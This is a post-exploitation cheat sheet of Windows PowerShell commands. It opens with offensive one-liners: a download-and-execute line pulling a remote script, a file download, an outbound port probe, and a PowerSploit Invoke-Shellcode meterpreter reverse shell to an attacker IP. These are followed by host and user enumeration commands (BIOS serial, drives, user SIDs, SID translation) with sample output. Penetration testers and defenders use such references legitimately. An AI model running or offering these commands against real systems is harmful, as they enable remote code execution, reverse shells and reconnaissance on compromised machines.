<!-- Code for collapse and expand -->
<script type="text/javascript"> 
$(document).ready(function() { 
$('div.view').hide(); 
$('div.slide').click(function() {
$(this).next('div.view').slideToggle('fast'); 
return false; 
}); 
}); 
</script>

# Windows Powershell Commands and Scripts for Post Exploitation

# One liners

**Download and Execute Remote Powershell Script**

```
iex (New-Object Net.WebClient).DownloadString("http://host/file.txt")
```

**Download and Save File**

```
(new-object System.Net.WebClient).Downloadfile('http://host/file.exe', 'file.exe')
```

**Enumerate Allowed Outbound Ports 1-1024**

```
$ErrorActionPreference = "silentlycontinue"; 1..1024 | % {$req = [System.Net.WebRequest]::Create("http://letmeoutofyour.net:$_"); $req.Timeout = 600; $resp = $req.GetResponse(); $respstream = $resp.GetResponseStream(); 
$stream = new-object System.IO.StreamReader $respstream; $out = $stream.ReadToEnd(); if ($out.trim() -eq "w00tw00t"){echo "$_ Allowed out"}}
```

**Reverse Shell Using [PowerSploit's Invoke-Shellcode](https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)**

```
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 -Lport 443 -Force
```

----

# Commands with Sample Output
## Hardware
### Get BIOS Information
 * **Command with arguments**: `gwmi win32_bios`
 * **Description**: Retrieves BIOS information including system serial number.
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> gwmi win32_bios<br>SMBIOSBIOSVersion : 6.00<br>Manufacturer      : Phoenix Technologies LTD<br>Name              : PhoenixBIOS 4.0 Release 6.0<br>SerialNumber      : VMware-56 4d 9b 0f 26 ba 8c f9-6e 7a 1e 33 5d 3c f0 dc<br>Version           : INTEL  - 6040000</code></div> 
   
### Get Drive Information
 * **Command with arguments**: `[System.IO.DriveInfo]::GetDrives()`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> [System.IO.DriveInfo]::GetDrives()<br><br>Name               : C:\<br>DriveType          : Fixed<br>DriveFormat        : NTFS<br>IsReady            : True<br>AvailableFreeSpace : 55568087552<br>TotalFreeSpace     : 55568087552<br>TotalSize          : 159876850304<br>RootDirectory      : C:\<br>VolumeLabel        : <br><br>Name               : D:\<br>DriveType          : CDRom<br>DriveFormat        : <br>IsReady            : False<br>AvailableFreeSpace : <br>TotalFreeSpace     : <br>TotalSize          : <br>RootDirectory      : D:\<br>VolumeLabel        : <br><br>Name               : G:\<br>DriveType          : Removable<br>DriveFormat        : <br>IsReady            : False<br>AvailableFreeSpace : <br>TotalFreeSpace     : <br>TotalSize          : <br>RootDirectory      : G:\<br>VolumeLabel        : <br><br>Name               : V:\<br>DriveType          : Network<br>DriveFormat        : NTFS<br>IsReady            : True<br>AvailableFreeSpace : 259182640616<br>TotalFreeSpace     : 259182640616<br>TotalSize          : 827361812256<br>RootDirectory      : V:\<br>VolumeLabel        : TestMappedDrive</code></div> 

## User Information
### Display Username, SID, Last Used
 * **Command with arguments**: `gwmi win32_userprofile | select -unique @{name="Name";expression={$_.__server}},@{name="SID";expression={$_.sid}},@{name="LastUseTime";expression={$_.converttodatetime($_.lastusetime)}},localpath | ft -auto`
 * **Description**: Retrieves information about system users.
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> gwmi win32\_userprofile | select -unique @{name="Name";expression={$\_.\_\_server}},@{name="SID";expressi<br>on={$\_.sid}},@{name="LastUseTime";expression={$\_.converttodatetime($\_.lastusetime)}},localpath | ft -auto<br><br>Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastUseTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;localpath<br>----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------<br>WIN-244VDGE5OGH&nbsp;S-1-5-21-1319606305-3131390644-2280705280-1000&nbsp;4/13/2012&nbsp;7:52:02&nbsp;PM&nbsp;C:\Users\johndoe<br>WIN-244VDGE5OGH&nbsp;S-1-5-20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\ServiceProfiles\Netwo...<br>WIN-244VDGE5OGH&nbsp;S-1-5-19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\ServiceProfiles\Local...<br>WIN-244VDGE5OGH&nbsp;S-1-5-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32\config\syste...</code></div> 
   
### Translate SID to Username
 * **Command with arguments**: `((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-19")).translate([System.Security.Principal.NTAccount])).value`
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> ((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-1319606305-3131390644-2280705280-<br>1000")).translate([System.Security.Principal.NTAccount])).value<br>WIN-244VDGE5OGH\johndoe</code></div> 